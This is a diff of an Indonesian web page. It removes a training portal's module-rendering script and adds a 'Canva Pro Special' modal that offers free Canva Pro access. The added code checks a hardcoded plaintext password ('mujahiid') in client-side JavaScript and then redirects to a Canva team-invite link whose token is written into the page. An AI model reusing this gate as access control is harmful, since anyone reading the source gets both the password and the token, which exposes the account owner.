-    {id:"05-google-bisnis",title:"Google Profil Bisnis",description:"Membuat atau mengklaim profil usaha agar tampil di Google Search dan Google Maps.",category:"Pondasi Digital",icon:"05",accent:"#34bf83",published:true,sortOrder:5,files:[],notes:[{id:"05a",title:"Gunakan data usaha nyata",content:"Isi nama, kategori, alamat atau area layanan, jam buka, nomor HP, deskripsi, dan foto. Jangan membuat alamat palsu."}]},
-    {id:"06-google-ads",title:"Google Ads",description:"Menyusun simulasi iklan pencarian berdasarkan kata kunci, lokasi, pesan, dan anggaran.",category:"Iklan Digital",icon:"06",accent:"#f6a84d",published:true,sortOrder:6,files:[],notes:[{id:"06a",title:"Simulasi tanpa pembayaran",content:"Pilih tujuan, kata kunci, lokasi, tiga judul, dua deskripsi, dan anggaran. Simpan pratinjau tanpa menayangkan iklan."}]},
-    {id:"07-sosial-media",title:"Media Sosial Bisnis",description:"Menyiapkan Instagram, WhatsApp Business, dan Facebook sebagai saluran komunikasi usaha.",category:"Media Sosial",icon:"07",accent:"#8a5cf6",published:true,sortOrder:7,files:[],notes:[{id:"07a",title:"Instagram dan WhatsApp Business",content:"Lengkapi profil, kontak, katalog atau konten, pesan salam, balasan cepat, link, dan screenshot. Jangan pernah memberikan kode OTP."}]},
-    {id:"08-meta-ads",title:"Meta Ads",description:"Menyusun simulasi iklan Facebook dan Instagram berdasarkan audiens serta materi promosi.",category:"Iklan Digital",icon:"08",accent:"#28b7d6",published:true,sortOrder:8,files:[],notes:[{id:"08a",title:"Tugas simulasi",content:"Pilih tujuan, lokasi, usia, minat, materi iklan, caption, tombol ajakan, dan anggaran. Tidak perlu menayangkan iklan."}]},
-    {id:"09-marketplace",title:"Marketplace",description:"Menyiapkan listing produk pada satu marketplace yang sesuai dengan jenis usaha.",category:"Penjualan Online",icon:"09",accent:"#ef765d",published:true,sortOrder:9,files:[],notes:[{id:"09a",title:"Pilih satu marketplace",content:"Siapkan foto, judul, deskripsi, harga, stok, variasi, berat, pengiriman, dan screenshot listing. Usaha jasa dapat membuat simulasi."}]},
-    {id:"10-affiliate",title:"TikTok & Shopee Affiliate",description:"Memilih produk affiliate dan menyiapkan ide konten untuk promosi.",category:"Affiliate",icon:"10",accent:"#2e374f",published:true,sortOrder:10,files:[],notes:[{id:"10a",title:"Fokus TikTok Affiliate",content:"Simpan nama dan harga produk, komisi yang terlihat, alasan memilih produk, screenshot, ide video, serta hasil video."}]},
-    {id:"11-google-flow",title:"Video AI dengan Google Flow",description:"Membuat video produk vertikal menggunakan foto referensi dan prompt yang terstruktur.",category:"AI & Konten",icon:"11",accent:"#6759d7",published:true,sortOrder:11,files:[],notes:[{id:"11a",title:"Target satu video",content:"Siapkan foto produk, gunakan prompt, pilih rasio 9:16, periksa hasil, lalu unduh video dan simpan screenshot."}]},
-    {id:"12-statistik",title:"Statistik & Insight",description:"Membaca statistik Blogger dan Insight Instagram menggunakan data yang benar-benar terlihat.",category:"Analitik",icon:"12",accent:"#28a77a",published:true,sortOrder:12,files:[],notes:[{id:"12a",title:"Jangan mengarang angka",content:"Ambil screenshot tayangan, jangkauan, interaksi, kunjungan profil, dan konten teratas. Tulis kesimpulan singkat."}]},
-    {id:"13-laporan",title:"Laporan Akhir",description:"Menggabungkan hasil praktik, link, screenshot, analisis, dan strategi optimasi ke dalam laporan.",category:"Laporan",icon:"13",accent:"#d76b94",published:true,sortOrder:13,files:[],notes:[{id:"13a",title:"File akhir",content:"Susun laporan yang rapi lalu simpan dalam format DOCX dan PDF. Pastikan semua link dapat dibuka dan screenshot dapat dibaca."}]},
-    {id:"14-pra-ujk",title:"PRA UJK",description:"Memeriksa kelengkapan berkas dan melatih peserta menjelaskan kembali setiap langkah praktik.",category:"Evaluasi",icon:"14",accent:"#d98a36",published:true,sortOrder:14,files:[],notes:[{id:"14a",title:"Bukan hanya mengumpulkan file",content:"Peserta harus dapat menunjukkan dan menjelaskan cara membuat Profil Usaha, Trends, Blogger, Google Bisnis, konten, statistik, Affiliate, video, dan laporan."}]}
-  ];
-  let settings={title:"Portal Pelatihan Digital Marketing BLK",subtitle:"Pelajari 14 materi secara berurutan, unduh file pendukung, dan baca catatan instruktur dalam satu portal.",heroLabel:"PORTAL RESMI KELAS DIGITAL MARKETING",welcomeNote:"Mulai dari modul 01. Selesaikan tugas dan simpan hasil sebelum melanjutkan ke materi berikutnya.",supportUrl:"https://wa.me/6280000000000",enabled:true,passwordHash:"",passwordHint:"Password diberikan oleh instruktur."},modules=[...fallbackModules],activeCategory="Semua",selectedModule=null;
-  const $=id=>document.getElementById(id),esc=value=>String(value??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[c])),safeAccent=value=>/^#[0-9a-f]{6}$/i.test(value||"")?value:"#755cf2";
-  function safeUrl(value){if(!value)return"#";try{const parsed=new URL(value,location.href);return["http:","https:"].includes(parsed.protocol)?value:"#"}catch{return"#"}}
-  async function hash(value){const digest=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(value));return[...new Uint8Array(digest)].map(v=>v.toString(16).padStart(2,"0")).join("")}
-  function toast(text,error=false){const el=$("toast");el.textContent=text;el.className=`toast show${error?" error":""}`;setTimeout(()=>el.className="toast",3200)}
-  function applySettings(){document.title=`${settings.title||"Portal Pelatihan Digital Marketing"} | Mujahiid`;$("subtitle").textContent=settings.subtitle||"";$("heroLabel").textContent=settings.heroLabel||"PORTAL RESMI KELAS DIGITAL MARKETING";$("welcomeNote").textContent=settings.welcomeNote||"";$("supportLink").href=safeUrl(settings.supportUrl);if(settings.enabled===false){$("gate").classList.add("show");document.body.classList.add("locked");$("gateIcon").textContent="⌧";$("gateTitle").textContent="Akses sedang ditutup";$("gateText").textContent="Admin sedang memperbarui materi kelas. Silakan kembali setelah akses dibuka.";$("passwordForm").style.display="none"}else if(settings.passwordHash&&sessionStorage.getItem("blkAccess")!==settings.passwordHash){$("gate").classList.add("show");document.body.classList.add("locked");$("gateTitle").textContent="Masukkan password akses";$("gateText").textContent=settings.passwordHint||"Password diberikan oleh instruktur.";$("passwordForm").style.display="flex"}else{$("gate").classList.remove("show");if(!$("moduleModal").classList.contains("show"))document.body.classList.remove("locked")}}
-  function totals(){const visible=modules.filter(m=>m.published!==false),fileTotal=visible.reduce((sum,m)=>sum+(m.showFiles===false?0:(m.files?.length||0)),0),noteTotal=visible.reduce((sum,m)=>sum+(m.showNotes===false?0:(m.notes?.length||0)),0);$("moduleCount").textContent=String(visible.length).padStart(2,"0");$("fileCount").textContent=String(fileTotal).padStart(2,"0");$("noteCount").textContent=String(noteTotal).padStart(2,"0")}
-  function renderFilters(){const cats=["Semua",...new Set(modules.filter(m=>m.published!==false).map(m=>m.category||"Materi"))];$("filters").innerHTML=cats.map(c=>`<button class="${c===activeCategory?"active":""}" data-cat="${esc(c)}">${esc(c)}</button>`).join("");$("filters").querySelectorAll("button").forEach(btn=>btn.onclick=()=>{activeCategory=btn.dataset.cat;renderFilters();renderModules()})}
-  function renderModules(){const key=$('searchInput').value.toLowerCase().trim(),list=modules.filter(m=>{if(m.published===false||!(activeCategory==='Semua'||m.category===activeCategory))return false;const searchable=[m.title,m.description,m.category,m.showFiles===false?'':(m.files||[]).map(f=>f.title).join(' '),m.showNotes===false?'':(m.notes||[]).map(n=>n.title).join(' '),m.showExamples===false?'':(m.photoExamples||[]).map(p=>`${p.title||''} ${p.description||''}`).join(' ')].join(' ').toLowerCase();return !key||searchable.includes(key)}).sort((a,b)=>(a.sortOrder||0)-(b.sortOrder||0));totals();$('moduleGrid').innerHTML=list.length?list.map((m,index)=>{const visibleFiles=m.showFiles===false?[]:(m.files||[]),visibleNotes=m.showNotes===false?[]:(m.notes||[]),visiblePhotos=m.showExamples===false?[]:(m.photoExamples||[]),previews=visibleFiles.slice(0,3),pills=[];if(m.showFiles!==false)pills.push(`<span class="count-pill">⇩ ${visibleFiles.length} FILE</span>`);if(m.showNotes!==false)pills.push(`<span class="count-pill">▤ ${visibleNotes.length} CATATAN</span>`);if(visiblePhotos.length)pills.push(`<span class="count-pill">▣ ${visiblePhotos.length} FOTO</span>`);let previewHtml='';if(previews.length)previewHtml=previews.map(f=>`<span class="preview-item"><i></i>${esc(f.title)}</span>`).join('');else if(visiblePhotos.length)previewHtml=visiblePhotos.slice(0,2).map(p=>`<span class="preview-item"><i></i>${esc(p.title||'Contoh foto')}</span>`).join('');return`<article class="module-card reveal" style="--accent:${safeAccent(m.accent)};--delay:${Math.min(index*55,275)}ms">
-<div class="module-top"><span class="module-icon">${esc(m.icon||'▦')}</span><span class="module-number">MODUL ${String(index+1).padStart(2,'0')}</span></div>
-<p class="module-category">${esc(m.category||'Digital Marketing')}</p><h3>${esc(m.title)}</h3><p class="module-desc">${esc(m.description||'')}</p>
-<div class="module-counts">${pills.join('')}</div><div class="preview-list">${previewHtml}</div>
-<button class="module-open" data-id="${m.id}"><span>Buka materi lengkap</span><b>→</b></button>
-</article>`}).join(''):'<div class="empty">Modul tidak ditemukan. Coba kata kunci atau kategori lain.</div>';$('moduleGrid').querySelectorAll('.module-open').forEach(btn=>btn.onclick=()=>openModule(btn.dataset.id));observeReveal()}
-  function openModule(id){selectedModule=modules.find(m=>m.id===id);if(!selectedModule)return;const files=selectedModule.files||[],notes=selectedModule.notes||[],photos=selectedModule.photoExamples||[],showFiles=selectedModule.showFiles!==false,showNotes=selectedModule.showNotes!==false,showExamples=selectedModule.showExamples!==false&&photos.length>0;$('dialogIcon').textContent=selectedModule.icon||'▦';$('dialogIcon').style.background=`color-mix(in srgb,${safeAccent(selectedModule.accent)} 20%,transparent)`;$('dialogCategory').textContent=selectedModule.category||'MODUL DIGITAL MARKETING';$('dialogTitle').textContent=selectedModule.title;$('dialogSubtitle').textContent=selectedModule.description||'';$('dialogFileCount').textContent=`(${files.length})`;$('dialogNoteCount').textContent=`(${notes.length})`;$('dialogExampleCount').textContent=`(${photos.length})`;$('dialogFilesTab').classList.toggle('hidden-tab',!showFiles);$('dialogNotesTab').classList.toggle('hidden-tab',!showNotes);$('dialogExamplesTab').classList.toggle('hidden-tab',!showExamples);$('dialogFiles').innerHTML=!showFiles?'':files.length?files.map(f=>{const isLink=(f.format||'').toUpperCase()==='LINK';return`<article class="file-row"><span class="file-format">${esc(f.format||'FILE')}</span><div class="file-copy"><strong>${esc(f.title)}</strong><p>${esc(f.description||'File pendukung materi pelatihan.')}</p></div><a class="file-download" href="${esc(safeUrl(f.downloadURL||f.url))}" target="_blank" rel="noopener" ${isLink?'':'download'}>${isLink?'↗ Buka':'⇩ Unduh'}</a></article>`}).join(''):'<div class="list-empty">Belum ada file pada modul ini.</div>';$('dialogNotes').innerHTML=!showNotes?'':notes.length?notes.map((n,i)=>`<article class="note-item"><div class="note-head"><h4>${esc(n.title||'Catatan Pelatihan')}</h4><button class="copy-note" type="button" data-note-index="${i}">⧉ Copy Text</button></div><p>${esc(n.content||'')}</p></article>`).join(''):'<div class="list-empty">Belum ada catatan pelatihan pada modul ini.</div>';if(showNotes&&notes.length)$('dialogNotes').querySelectorAll('.copy-note').forEach(btn=>btn.onclick=async()=>{const note=notes[Number(btn.dataset.noteIndex)];if(!note)return;const text=[note.title||'Catatan Pelatihan',note.content||''].filter(Boolean).join('\n\n');try{if(navigator.clipboard&&window.isSecureContext)await navigator.clipboard.writeText(text);else{const area=document.createElement('textarea');area.value=text;area.style.position='fixed';area.style.opacity='0';document.body.appendChild(area);area.select();document.execCommand('copy');area.remove()}const old=btn.textContent;btn.textContent='✓ Tersalin';btn.classList.add('copied');toast('Catatan berhasil disalin.');setTimeout(()=>{btn.textContent=old;btn.classList.remove('copied')},1400)}catch(error){console.error(error);toast('Catatan tidak dapat disalin. Coba lagi.',true)}});$('dialogExamples').innerHTML=!showExamples?'':photos.length?photos.map(p=>`<article class="photo-card"><div class="photo-frame" role="button" tabindex="0" data-photo-id="${p.id}" title="Klik untuk memperbesar"><img src="${esc(p.downloadURL||p.url||'')}" alt="${esc(p.title||'Contoh foto')}" draggable="false"></div><div class="photo-copy"><strong>${esc(p.title||'Contoh foto')}</strong><p>${esc(p.description||'Perhatikan bagian yang terlihat pada contoh ini.')}</p></div></article>`).join(''):'<div class="list-empty">Belum ada contoh foto pada modul ini.</div>';$('dialogExamples').querySelectorAll('.photo-frame').forEach(frame=>{frame.oncontextmenu=e=>e.preventDefault();frame.ondragstart=e=>e.preventDefault();frame.onclick=()=>openPhotoViewer(frame.dataset.photoId);frame.onkeydown=e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();openPhotoViewer(frame.dataset.photoId)}}});const firstTab=showFiles?'files':showNotes?'notes':showExamples?'examples':null;if(firstTab)setDialogTab(firstTab);else{$('dialogFilesTab').classList.remove('hidden-tab');$('dialogFileCount').textContent='(0)';$('dialogFiles').innerHTML='<div class="list-empty">Materi tambahan untuk modul ini belum tersedia.</div>';setDialogTab('files')}$('moduleModal').classList.add('show');document.body.classList.add('locked')}
-  function closeModule(){$('moduleModal').classList.remove('show');closePhotoViewer();if(!$('gate').classList.contains('show'))document.body.classList.remove('locked')}
-  function setDialogTab(tab){const target=$(`panel-${tab}`);if(!target)return;document.querySelectorAll('.dialog-tabs button').forEach(btn=>btn.classList.toggle('active',btn.dataset.tab===tab));document.querySelectorAll('.tab-panel').forEach(panel=>panel.classList.remove('active'));target.classList.add('active')}
-  function openPhotoViewer(id){const photo=(selectedModule?.photoExamples||[]).find(p=>p.id===id);if(!photo)return;$('photoViewerImage').src=photo.downloadURL||photo.url||'';$('photoViewerTitle').textContent=photo.title||'Contoh foto';$('photoViewerDescription').textContent=photo.description||'Pratinjau bagian yang harus difoto.';$('photoViewer').classList.add('show');$('photoViewer').setAttribute('aria-hidden','false')}
-  function closePhotoViewer(){$('photoViewer').classList.remove('show');$('photoViewer').setAttribute('aria-hidden','true');$('photoViewerImage').removeAttribute('src')}
-  function observeReveal(){const observer=new IntersectionObserver(entries=>entries.forEach(entry=>{if(entry.isIntersecting){entry.target.classList.add("visible");observer.unobserve(entry.target)}}),{threshold:.1});document.querySelectorAll(".reveal:not(.visible)").forEach(el=>observer.observe(el))}
-  $("searchInput").oninput=renderModules;$("dialogClose").onclick=closeModule;$("moduleModal").onclick=e=>{if(e.target===$("moduleModal"))closeModule()};document.querySelectorAll(".dialog-tabs button").forEach(btn=>btn.onclick=()=>{if(!btn.classList.contains('hidden-tab'))setDialogTab(btn.dataset.tab)});$("photoViewerClose").onclick=closePhotoViewer;$("photoViewer").onclick=e=>{if(e.target===$("photoViewer"))closePhotoViewer()};$("photoViewer").oncontextmenu=e=>e.preventDefault();$("photoViewer").ondragstart=e=>e.preventDefault();document.addEventListener("keydown",e=>{if(e.key==="Escape"&&$("photoViewer").classList.contains("show"))return closePhotoViewer();if(e.key==="Escape"&&$("moduleModal").classList.contains("show"))closeModule()});
-  $("passwordForm").onsubmit=async e=>{e.preventDefault();const value=await hash($("passwordInput").value.trim());if(value===settings.passwordHash){sessionStorage.setItem("blkAccess",value);$("gateError").textContent="";applySettings();toast("Portal kelas berhasil dibuka.")}else $("gateError").textContent="Password tidak sesuai."};
-  async function start(){try{const configRef=doc(db,"blkPortal","config"),snap=await getDoc(configRef);if(snap.exists())settings={...settings,...snap.data()};onSnapshot(configRef,snapshot=>{if(snapshot.exists())settings={...settings,...snapshot.data()};applySettings()},()=>{});onSnapshot(query(collection(db,"blkModules"),orderBy("sortOrder","asc")),snapshot=>{if(!snapshot.empty)modules=snapshot.docs.map(d=>({id:d.id,...d.data()}));renderFilters();renderModules()},()=>{renderFilters();renderModules()})}catch(error){console.error(error);toast("Data online belum tersedia. Menampilkan modul bawaan.",true)}finally{applySettings();renderFilters();renderModules();observeReveal();$("loading").classList.add("hide");document.body.classList.add("ready")}}
-  start();
-</script>
+      </section>
+
+      <div class="footer-note">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/>
+          <path d="M12 11v6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          <path d="M12 7h.01" stroke="currentColor" stroke-width="3" stroke-linecap="round"/>
+        </svg>
+        <span><strong>Catatan:</strong> Pilih <strong>Akses Free</strong> untuk mengikuti panduan video Canva Pro gratis. Jika ingin layanan lebih cepat, prioritas, dan dibantu admin, pilih <strong>Akses VIP</strong>. Pastikan mengikuti instruksi password dengan teliti agar proses masuk berjalan lancar.</span>
+      </div>
+    </section>
+  </main>
+
+  <div
+    class="special-modal"
+    id="specialAccessModal"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="specialAccessTitle"
+    aria-hidden="true"
+  >
+    <div class="special-modal-panel" role="document">
+      <div class="special-modal-header">
+        <div>
+          <h2 id="specialAccessTitle">Canva Pro Special</h2>
+          <p>Masukkan password untuk melanjutkan ke link khusus.</p>
+        </div>
+        <button class="special-modal-close" type="button" data-close-special-modal aria-label="Tutup">&times;</button>
+      </div>
+
+      <form class="special-form" id="specialAccessForm" autocomplete="off">
+
+        <label for="specialPassword">Password akses</label>
+        <input
+          class="special-password-input"
+          id="specialPassword"
+          name="special_password"
+          type="password"
+          placeholder="Masukkan password"
+          required
+          autofocus
+        >
+        <p class="special-error" id="specialAccessError" role="alert" hidden>Password salah. Silakan coba kembali.</p>
+
+        <button class="btn btn-primary special" type="submit">Buka Akses Special</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    (() => {
+      const modal = document.getElementById('specialAccessModal');
+      const input = document.getElementById('specialPassword');
+      const openButtons = document.querySelectorAll('[data-open-special-modal]');
+      const closeButtons = document.querySelectorAll('[data-close-special-modal]');
+
+      if (!modal) return;
+
+      const openModal = () => {
+        modal.classList.add('is-open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('modal-open');
+        window.setTimeout(() => input?.focus(), 50);
+      };
+
+      const closeModal = () => {
+        modal.classList.remove('is-open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('modal-open');
+      };
+
+      openButtons.forEach(button => button.addEventListener('click', openModal));
+      closeButtons.forEach(button => button.addEventListener('click', closeModal));
+
+      modal.addEventListener('click', event => {
+        if (event.target === modal) closeModal();
+      });
+
+      document.addEventListener('keydown', event => {
+        if (event.key === 'Escape' && modal.classList.contains('is-open')) closeModal();
+      });
+
+      if (modal.classList.contains('is-open')) {
+        document.body.classList.add('modal-open');
+        window.setTimeout(() => input?.focus(), 50);
+      }
+
+      const form = document.getElementById('specialAccessForm');
+      const errorBox = document.getElementById('specialAccessError');
+      form?.addEventListener('submit', event => {
+        event.preventDefault();
+        const password = input?.value || '';
+        if (password === 'mujahiid') {
+          window.location.href = 'https://www.canva.com/brand/join?token=rnbAWR5nWyH3d2Ow554o8Q&referrer=team-invite';
+          return;
+        }
+        if (errorBox) errorBox.hidden = false;
+        input?.focus();
+      });
+    })();
+  </script>
 </body>
 </html>
